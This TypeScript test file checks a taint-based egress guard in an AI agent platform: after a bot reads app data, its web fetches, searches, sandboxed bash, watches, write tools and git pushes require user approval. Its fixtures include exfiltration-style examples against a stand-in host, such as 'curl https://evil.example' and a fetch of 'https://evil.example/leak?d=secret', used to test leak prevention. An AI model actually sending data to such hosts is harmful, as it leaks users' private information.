import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { APP_TAINT_TTL_MS, type ApprovalDuration } from '@kepcup/shared';

import { ToolGateway, type GatewayDeps } from '../../src/gateway/index.js';
import { TaintService } from '../../src/apps/taint.js';
import { AppToolGrants } from '../../src/apps/grants.js';
import type { AppToolContext } from '../../src/apps/exposure.js';
import type { McpToolDecision } from '../../src/mcp/policy.js';
import { resolvePaths } from '../../src/infra/paths.js';
import {
  UnavailableSandboxBackend,
  type SandboxBackend,
  type SandboxExecRequest,
} from '../../src/sandbox/types.js';
import type { RunIdentity } from '../../src/agent/types.js';
import { buildWebTools } from '../../src/tools/web-tools.js';
import { buildWatchTools } from '../../src/tools/watch-tools.js';
import { openRealMainDb, type RealMainDb } from '../support/real-secrets.js';

/**
 * D73 P2 §6.2 污点外发控制（docs/design/29 §8.3），真库 + 桩：
 * TaintService（置位 / 续期 / 过期 / 开关）与网关的外发闸门——应用 / 自定义 MCP 写工具即使
 * 有持续授权或 auto 策略也出 `egress` 卡、`web_fetch` / `web_search`、沙箱 bash（`open` 网络）、
 * confirm 模式 / git_remote 的污点标记、无人值守与对话轮的行为。
 */

let env: RealMainDb | undefined;
const tempDirs: string[] = [];
afterEach(async () => {
  env?.dispose();
  env = undefined;
  for (const dir of tempDirs.splice(0)) await rm(dir, { recursive: true, force: true });
});

const logger = { info() {}, warn() {}, error() {}, debug() {} } as never;

const BOT = 'bot_1';
const CONV = 'conv_1';
const task: RunIdentity = { runId: 'run_1', botId: BOT, conversationId: CONV, loopType: 'task' };
const turn: RunIdentity = { runId: 'run_t', botId: BOT, conversationId: CONV, loopType: 'turn' };

const CONNECTION: AppToolContext = {
  connectionId: 'conn_gh',
  connectorId: 'github',
  connectorSlug: 'github',
  accountLabel: 'jyy@example.com',
  appName: 'GitHub',
  tier: 'verified',
};
const SERVER = { id: 'conn_gh', name: 'GitHub（jyy@example.com）' };

function decision(overrides: Partial<McpToolDecision> = {}): McpToolDecision {
  return {
    risk: 'write',
    riskSource: 'annotation',
    approval: 'ask',
    approvalSource: 'default',
    enabled: true,
    ...overrides,
  };
}

interface HarnessOptions {
  decision?: McpToolDecision;
  taintGuard?: boolean;
  unattended?: boolean;
  sandbox?: SandboxBackend;
  answer?: 'approved' | 'denied';
  duration?: ApprovalDuration;
  projects?: unknown;
  allowlistExempt?: boolean;
}

async function harness(options: HarnessOptions = {}) {
  env = openRealMainDb();
  env.db
    .prepare(
      "insert into app_connections (id, connector_id, label, status, created_at, updated_at) values ('conn_gh', 'github', 'g', 'connected', 1, 1)",
    )
    .run();
  env.db
    .prepare("insert into conversations (id, type, created_at) values ('conv_1', 'group', 1)")
    .run();
  const settings = { taintGuard: options.taintGuard ?? true };
  const taint = new TaintService({
    db: env.db,
    clock: env.clock,
    settings: { get: () => ({ apps: { ...settings } }) as never },
  });
  const grants = new AppToolGrants({ db: env.db, clock: env.clock });
  const requests: Array<{ kind: string; payload: Record<string, unknown> }> = [];
  const home = await mkdtemp(path.join(tmpdir(), 'taint-gw-'));
  tempDirs.push(home);
  const answer = options.answer ?? 'approved';
  const deps: GatewayDeps = {
    paths: resolvePaths(home),
    sandbox: options.sandbox ?? new UnavailableSandboxBackend('test'),
    audit: { record() {} } as unknown as GatewayDeps['audit'],
    secrets: { redact: (text: string) => text } as unknown as GatewayDeps['secrets'],
    logger,
    approvals: {
      request: async (_identity: unknown, kind: string, payload: Record<string, unknown>) => {
        requests.push({ kind, payload });
        return {
          approval: {
            id: `apr_${requests.length}`,
            autoApproved: options.unattended === true,
            decision: options.duration !== undefined ? { duration: options.duration } : null,
          },
          decision: answer,
        };
      },
    } as unknown as GatewayDeps['approvals'],
    grants: {
      listEffective: () => [],
      noteOnceUse() {},
    } as unknown as GatewayDeps['grants'],
    allowlist: {
      match: () => ({ exempt: options.allowlistExempt === true }),
    } as unknown as GatewayDeps['allowlist'],
    unattended: {
      effective: () => ({ enabled: options.unattended === true }),
    } as unknown as GatewayDeps['unattended'],
    projects: (options.projects ?? {
      policyInfo: () => null,
      writeDenial: () => null,
    }) as GatewayDeps['projects'],
    platform: 'linux',
    readOnlyRootsOverride: [],
    sensitiveOverride: [],
    appGrants: grants,
    taint,
    mcpToolDecision: async () => options.decision ?? decision(),
  };
  const gateway = new ToolGateway(deps);
  return { gateway, taint, grants, requests, settings };
}

type Harness = Awaited<ReturnType<typeof harness>>;

const callApp = (h: Harness, identity: RunIdentity = task, openWorldHint?: boolean) =>
  h.gateway.mcpToolCall(
    identity,
    SERVER,
    'create_issue',
    { title: 'x' },
    {
      connection: CONNECTION,
      openWorldHint,
    },
  );

describe('TaintService', () => {
  it('mark creates and renews; first_at survives a renewal, expiry restarts the taint', async () => {
    const h = await harness();
    const now = env!.clock;
    now.set(10_000);
    expect(h.taint.isTainted(BOT, CONV)).toBe(false);
    h.taint.mark(BOT, CONV);
    expect(h.taint.state(BOT, CONV)).toEqual({
      firstAt: 10_000,
      expiresAt: 10_000 + APP_TAINT_TTL_MS,
    });
    now.set(20_000);
    h.taint.mark(BOT, CONV);
    expect(h.taint.state(BOT, CONV)).toEqual({
      firstAt: 10_000,
      expiresAt: 20_000 + APP_TAINT_TTL_MS,
    });
    // per (bot, conversation): another pair is clean
    expect(h.taint.isTainted(BOT, 'conv_other')).toBe(false);
    expect(h.taint.isTainted('bot_other', CONV)).toBe(false);
    // 24 h after the last read: expired; a new mark starts a fresh taint
    now.set(20_000 + APP_TAINT_TTL_MS);
    expect(h.taint.isTainted(BOT, CONV)).toBe(false);
    h.taint.mark(BOT, CONV);
    expect(h.taint.state(BOT, CONV)?.firstAt).toBe(20_000 + APP_TAINT_TTL_MS);
  });

  it('sweepExpired removes only expired rows; guard honours the switch but state ignores it', async () => {
    const h = await harness();
    env!.clock.set(1_000);
    h.taint.mark(BOT, 'conv_old');
    env!.clock.set(1_000 + APP_TAINT_TTL_MS - 1);
    h.taint.mark(BOT, CONV);
    env!.clock.set(1_000 + APP_TAINT_TTL_MS);
    // 'conv_old' just expired; marking sweeps it
    expect(h.taint.sweepExpired()).toBe(1);
    expect(h.taint.isTainted(BOT, CONV)).toBe(true);
    expect(h.taint.guard(BOT, CONV)).not.toBeNull();
    h.settings.taintGuard = false;
    expect(h.taint.guard(BOT, CONV)).toBeNull();
    expect(h.taint.isTainted(BOT, CONV)).toBe(true);
    expect(h.taint.guard(null, CONV)).toBeNull();
    expect(h.taint.guard(BOT, null)).toBeNull();
  });
});

describe('TaintService: conversation-level guard, inheritance, cleanup', () => {
  it('a group is tainted for every member once any member read app data (guard), while state stays per bot', async () => {
    const h = await harness();
    h.taint.mark('bot_a', 'conv_group');
    expect(h.taint.guard('bot_b', 'conv_group')).not.toBeNull();
    expect(h.taint.state('bot_b', 'conv_group')).toBeNull();
    expect(h.taint.guard('bot_b', 'conv_other')).toBeNull();
    // bot B's own web_fetch in the group is carded
    const b: RunIdentity = {
      runId: 'run_b',
      botId: 'bot_b',
      conversationId: 'conv_group',
      loopType: 'task',
    };
    await h.gateway.egressCheck(b, {
      channel: 'web_fetch',
      target: 'https://x.example',
      summary: 's',
    });
    expect(h.requests.map((r) => r.kind)).toEqual(['egress']);
    // expiry applies to the conversation as a whole
    env!.clock.set(env!.clock.now() + APP_TAINT_TTL_MS);
    expect(h.taint.guard('bot_b', 'conv_group')).toBeNull();
  });

  it('inherit carries the source taint (first_at kept, no extension) to another bot / conversation', async () => {
    const h = await harness();
    env!.clock.set(1_000);
    h.taint.mark('bot_a', 'conv_a');
    env!.clock.set(50_000);
    expect(
      h.taint.inherit(
        { botId: 'bot_a', conversationId: 'conv_a' },
        { botId: 'bot_b', conversationId: 'conv_b' },
      ),
    ).toBe(true);
    expect(h.taint.state('bot_b', 'conv_b')).toEqual({
      firstAt: 1_000,
      expiresAt: 1_000 + APP_TAINT_TTL_MS,
    });
    // an untainted source passes nothing; a later, longer target taint is not shortened
    expect(
      h.taint.inherit(
        { botId: 'bot_x', conversationId: 'conv_x' },
        { botId: 'bot_y', conversationId: 'conv_y' },
      ),
    ).toBe(false);
    expect(h.taint.isTainted('bot_y', 'conv_y')).toBe(false);
    h.taint.mark('bot_b', 'conv_b');
    const longer = h.taint.state('bot_b', 'conv_b')!.expiresAt;
    h.taint.inherit(
      { botId: 'bot_a', conversationId: 'conv_a' },
      { botId: 'bot_b', conversationId: 'conv_b' },
    );
    expect(h.taint.state('bot_b', 'conv_b')!.expiresAt).toBe(longer);
  });

  it('deleteForConversation removes all rows of a conversation; deleteForBotInConversations only the named ones', async () => {
    const h = await harness();
    h.taint.mark('bot_a', 'conv_g');
    h.taint.mark('bot_b', 'conv_g');
    h.taint.mark('bot_a', 'conv_dm');
    expect(h.taint.deleteForBotInConversations('bot_a', ['conv_dm'])).toBe(1);
    expect(h.taint.isTainted('bot_a', 'conv_g')).toBe(true);
    expect(h.taint.deleteForConversation('conv_g')).toBe(2);
    expect(h.taint.guard('bot_a', 'conv_g')).toBeNull();
  });
});

describe('gateway egress: app and MCP tools', () => {
  it('a write app tool with a persistent grant is carded (egress app_tool) while tainted, and not before', async () => {
    const h = await harness();
    h.grants.create({
      botId: BOT,
      connectionId: 'conn_gh',
      toolName: 'create_issue',
      conversationId: null,
      approvalId: null,
    });
    // untainted: the standing grant covers the call, no card
    await callApp(h);
    expect(h.requests).toEqual([]);
    // tainted: one egress card, the grant is not consulted
    h.taint.mark(BOT, CONV);
    const result = await callApp(h);
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({
      kind: 'egress',
      payload: { channel: 'app_tool', taintedSince: env!.clock.now() },
    });
    expect(String(h.requests[0]!.payload['target'])).toContain('"create_issue"');
    expect(String(h.requests[0]!.payload['target'])).toContain('"title": "x"');
    expect(String(h.requests[0]!.payload['summary'])).toContain('jyy@example.com');
    expect(result.approvedBy).toBe('user');
    expect(result.grantId).toBeUndefined();
  });

  it('a custom MCP write tool on an auto policy (autoApprove) is carded with channel mcp_tool', async () => {
    const h = await harness({
      decision: decision({ approval: 'auto', approvalSource: 'server' }),
    });
    await h.gateway.mcpToolCall(task, { id: 'srv', name: 'Chat' }, 'send_message', { to: 'a' });
    expect(h.requests).toEqual([]);
    h.taint.mark(BOT, CONV);
    await h.gateway.mcpToolCall(task, { id: 'srv', name: 'Chat' }, 'send_message', { to: 'a' });
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({ kind: 'egress', payload: { channel: 'mcp_tool' } });
  });

  it('read-only tools and openWorldHint:false tools are not egress channels', async () => {
    const h = await harness();
    h.taint.mark(BOT, CONV);
    // closed-world write: the usual mcp_tool ask path (not egress)
    await callApp(h, task, false);
    expect(h.requests.map((r) => r.kind)).toEqual(['mcp_tool']);
    // read: no card at all
    const reader = await harness({ decision: decision({ risk: 'read', approval: 'auto' }) });
    reader.taint.mark(BOT, CONV);
    await callApp(reader);
    expect(reader.requests).toEqual([]);
  });

  it('a custom MCP read tool with openWorldHint:true is an egress channel; catalog read tools and unknown hints are not', async () => {
    const h = await harness({ decision: decision({ risk: 'read', approval: 'auto' }) });
    const custom = (hint?: boolean) =>
      h.gateway.mcpToolCall(
        task,
        { id: 'srv', name: 'Fetch' },
        'fetch_url',
        { url: 'u' },
        { openWorldHint: hint },
      );
    h.taint.mark(BOT, CONV);
    await custom(undefined);
    await custom(false);
    // the catalog app's own read tools are the taint source: never carded
    await callApp(h, task, true);
    expect(h.requests).toEqual([]);
    await custom(true);
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({ kind: 'egress', payload: { channel: 'mcp_tool' } });
    expect(String(h.requests[0]!.payload['target'])).toContain('"fetch_url"');
  });

  it('switch off → no egress card; 24 h later → no egress card', async () => {
    const h = await harness({ taintGuard: false });
    h.taint.mark(BOT, CONV);
    await callApp(h);
    expect(h.requests.map((r) => r.kind)).toEqual(['mcp_tool']);

    const expired = await harness();
    env!.clock.set(5_000);
    expired.taint.mark(BOT, CONV);
    env!.clock.set(5_000 + APP_TAINT_TTL_MS);
    await callApp(expired);
    expect(expired.requests.map((r) => r.kind)).toEqual(['mcp_tool']);
  });

  it('a denial throws APPROVAL_DENIED; unattended auto-approval reports approvedBy unattended', async () => {
    const denied = await harness({ answer: 'denied' });
    denied.taint.mark(BOT, CONV);
    await expect(callApp(denied)).rejects.toMatchObject({ code: 'APPROVAL_DENIED' });

    const auto = await harness({ unattended: true });
    auto.taint.mark(BOT, CONV);
    const result = await callApp(auto);
    expect(result.approvedBy).toBe('unattended');
  });

  it('an ask without a standing grant stays one mcp_tool card — flagged tainted, with the full arguments', async () => {
    const h = await harness();
    await callApp(h);
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]!.kind).toBe('mcp_tool');
    expect(h.requests[0]!.payload['tainted']).toBeUndefined();
    expect(h.requests[0]!.payload['argsFull']).toBeUndefined();
    h.requests.length = 0;
    h.taint.mark(BOT, CONV);
    await callApp(h);
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({
      kind: 'mcp_tool',
      payload: { tainted: true, taintedSince: env!.clock.now(), risk: 'write' },
    });
    expect(JSON.parse(String(h.requests[0]!.payload['argsFull']))).toEqual({ title: 'x' });
  });

  it('an egress card never offers a longer duration and never creates a grant', async () => {
    const h = await harness({ duration: 'bot', decision: decision({ approval: 'auto' }) });
    h.taint.mark(BOT, CONV);
    const result = await callApp(h);
    expect(h.requests[0]!.kind).toBe('egress');
    expect(h.requests[0]!.payload['durations']).toBeUndefined();
    expect(result.grantId).toBeUndefined();
    expect(
      h.grants.find({
        botId: BOT,
        connectionId: 'conn_gh',
        toolName: 'create_issue',
        conversationId: CONV,
      }),
    ).toBeNull();
  });
});

describe('gateway egressCheck', () => {
  it('returns null without taint; cards with taint; truncates huge targets', async () => {
    const h = await harness();
    const input = { channel: 'web_fetch' as const, target: 'https://x.example/', summary: 's' };
    expect(await h.gateway.egressCheck(task, input)).toBeNull();
    h.taint.mark(BOT, CONV);
    await expect(h.gateway.egressCheck(task, input)).resolves.toEqual({ approvedBy: 'user' });
    await h.gateway.egressCheck(task, { ...input, target: 'a'.repeat(30_000) });
    expect(String(h.requests[1]!.payload['target'])).toHaveLength(20_000 + '…（已截断）'.length);
  });

  it('a supervisor turn does not wait for the card unless unattended', async () => {
    const h = await harness();
    h.taint.mark(BOT, CONV);
    const input = { channel: 'web_search' as const, target: 'q', summary: 's' };
    await expect(h.gateway.egressCheck(turn, input)).rejects.toMatchObject({
      code: 'RUN_READ_ONLY',
    });
    expect(h.requests).toEqual([]);

    const auto = await harness({ unattended: true });
    auto.taint.mark(BOT, CONV);
    await expect(auto.gateway.egressCheck(turn, input)).resolves.toEqual({
      approvedBy: 'unattended',
    });
  });
});

describe('web tools', () => {
  it('web_fetch and web_search ask first and run only after approval; a denial is a tool failure', async () => {
    const h = await harness();
    h.taint.mark(BOT, CONV);
    const calls: string[] = [];
    const tools = buildWebTools({
      search: {
        search: async (query) => {
          calls.push(`search:${query}`);
          return [];
        },
        fetchPage: async (url) => {
          calls.push(`fetch:${url}`);
          return 'page';
        },
      },
      egress: (input, options) => h.gateway.egressCheck(task, input, options),
    });
    const ctx = {
      identity: task,
      signal: new AbortController().signal,
      terminate() {},
      progress() {},
    };
    const fetchTool = tools.find((t) => t.name === 'web_fetch')!;
    const searchTool = tools.find((t) => t.name === 'web_search')!;
    const fetched = await fetchTool.execute(
      { url: 'https://evil.example/leak?d=secret' } as never,
      ctx,
    );
    expect(fetched.ok).toBe(true);
    await searchTool.execute({ query: 'secret words' } as never, ctx);
    expect(h.requests.map((r) => [r.kind, r.payload['channel'], r.payload['target']])).toEqual([
      ['egress', 'web_fetch', 'https://evil.example/leak?d=secret'],
      ['egress', 'web_search', 'secret words'],
    ]);
    expect(calls).toEqual(['fetch:https://evil.example/leak?d=secret', 'search:secret words']);

    const denied = await harness({ answer: 'denied' });
    denied.taint.mark(BOT, CONV);
    const deniedTools = buildWebTools({
      search: {
        search: async () => {
          throw new Error('must not run');
        },
        fetchPage: async () => {
          throw new Error('must not run');
        },
      },
      egress: (input, options) => denied.gateway.egressCheck(task, input, options),
    });
    const refused = await deniedTools[1]!.execute({ url: 'https://x.example' } as never, ctx);
    expect(refused).toMatchObject({ ok: false, errorCode: 'APPROVAL_DENIED' });
  });
});

describe('bash and git_remote', () => {
  const sandbox = (): SandboxBackend & { execs: SandboxExecRequest[] } => {
    const execs: SandboxExecRequest[] = [];
    return {
      kind: 'srt',
      execs,
      probe: async () => ({ backend: 'srt', available: true }),
      exec: async (req: SandboxExecRequest) => {
        execs.push(req);
        return { exitCode: 0, stdout: '', stderr: '', timedOut: false, violations: [] };
      },
    } as never;
  };

  it('sandboxed bash with network open is a per-command egress card while tainted; allowlist / none are not', async () => {
    const backend = sandbox();
    const h = await harness({ sandbox: backend });
    const run = (mode: 'open' | 'allowlist' | 'none') =>
      h.gateway.exec(task, {
        command: 'curl https://evil.example',
        network: { mode, allowDomains: [] },
      });
    await run('open');
    expect(h.requests).toEqual([]);
    h.taint.mark(BOT, CONV);
    await run('allowlist');
    await run('none');
    expect(h.requests).toEqual([]);
    await run('open');
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({
      kind: 'egress',
      payload: { channel: 'bash', target: 'curl https://evil.example' },
    });
    expect(backend.execs).toHaveLength(4);
    // a denial stops the command
    const denied = await harness({ sandbox: sandbox(), answer: 'denied' });
    denied.taint.mark(BOT, CONV);
    await expect(
      denied.gateway.exec(task, { command: 'curl x', network: { mode: 'open', allowDomains: [] } }),
    ).rejects.toMatchObject({ code: 'APPROVAL_DENIED' });
  });

  it('a command the read-only allowlist vouches for stays unconfirmed even with the network open', async () => {
    const backend = sandbox();
    const h = await harness({ sandbox: backend, allowlistExempt: true });
    h.taint.mark(BOT, CONV);
    await h.gateway.exec(task, { command: 'ls -la', network: { mode: 'open', allowDomains: [] } });
    expect(h.requests).toEqual([]);
    expect(backend.execs).toHaveLength(1);
  });

  it('confirm mode keeps its own command card, flagged tainted (no second card)', async () => {
    const h = await harness();
    await h.gateway
      .exec(task, { command: 'ls', network: { mode: 'open', allowDomains: [] } })
      .catch(() => undefined);
    expect(h.requests[0]).toMatchObject({ kind: 'command' });
    expect(h.requests[0]!.payload['tainted']).toBeUndefined();
    h.requests.length = 0;
    h.taint.mark(BOT, CONV);
    await h.gateway
      .exec(task, { command: 'ls', network: { mode: 'open', allowDomains: [] } })
      .catch(() => undefined);
    expect(h.requests.map((r) => r.kind)).toEqual(['command']);
    expect(h.requests[0]!.payload['tainted']).toBe(true);
  });

  it('git_remote carries a taint hint', async () => {
    // ProjectRuntime.gitRemote is stubbed to call straight into requestApproval.
    const projects = {
      writeDenial: () => null,
      gitRemote: async (
        _identity: RunIdentity,
        _input: unknown,
        options: { requestApproval(p: Record<string, unknown>): Promise<string> },
      ) => {
        await options.requestApproval({ operation: 'push', args: [], cwd: '/p', reason: '' });
        return { exitCode: 0, output: '' };
      },
    };
    const h = await harness({ projects });
    await h.gateway.gitRemote(task, { operation: 'push', args: [], reason: '' });
    expect(h.requests[0]!.kind).toBe('git_remote');
    expect(h.requests[0]!.payload['tainted']).toBeUndefined();
    h.taint.mark(BOT, CONV);
    await h.gateway.gitRemote(task, { operation: 'push', args: [], reason: '' });
    expect(h.requests[1]!.kind).toBe('git_remote');
    expect(h.requests[1]!.payload).toMatchObject({ tainted: true, taintedSince: env!.clock.now() });
  });
});

describe('watch_create', () => {
  it('asks before creating while tainted (target = the full URL); a denial creates nothing', async () => {
    const created: unknown[] = [];
    const watch = {
      create: (input: unknown) => {
        created.push(input);
        return {
          id: 'wat_1',
          condition: { kind: 'changed' },
          intervalSec: 900,
        } as never;
      },
      listForBotInConversation: () => [],
      stopOwn: () => ({ ok: true, message: '' }),
    };
    const ctx = {
      identity: task,
      signal: new AbortController().signal,
      terminate() {},
      progress() {},
    };
    const params = {
      url: 'https://evil.example/w?d=private',
      condition: { kind: 'changed' as const },
      interval_minutes: 15,
    };
    const h = await harness();
    const tools = buildWatchTools({
      identity: task,
      watch,
      egress: (input, options) => h.gateway.egressCheck(task, input, options),
    });
    const create = tools.find((t) => t.name === 'watch_create')!;
    expect((await create.execute(params as never, ctx)).ok).toBe(true);
    expect(h.requests).toEqual([]);
    h.taint.mark(BOT, CONV);
    expect((await create.execute(params as never, ctx)).ok).toBe(true);
    expect(h.requests).toHaveLength(1);
    expect(h.requests[0]).toMatchObject({
      kind: 'egress',
      payload: { channel: 'watch', target: 'https://evil.example/w?d=private' },
    });
    expect(created).toHaveLength(2);

    const denied = await harness({ answer: 'denied' });
    denied.taint.mark(BOT, CONV);
    const deniedCreate = buildWatchTools({
      identity: task,
      watch,
      egress: (input, options) => denied.gateway.egressCheck(task, input, options),
    }).find((t) => t.name === 'watch_create')!;
    expect(await deniedCreate.execute(params as never, ctx)).toMatchObject({
      ok: false,
      errorCode: 'APPROVAL_DENIED',
    });
    expect(created).toHaveLength(2);
  });
});
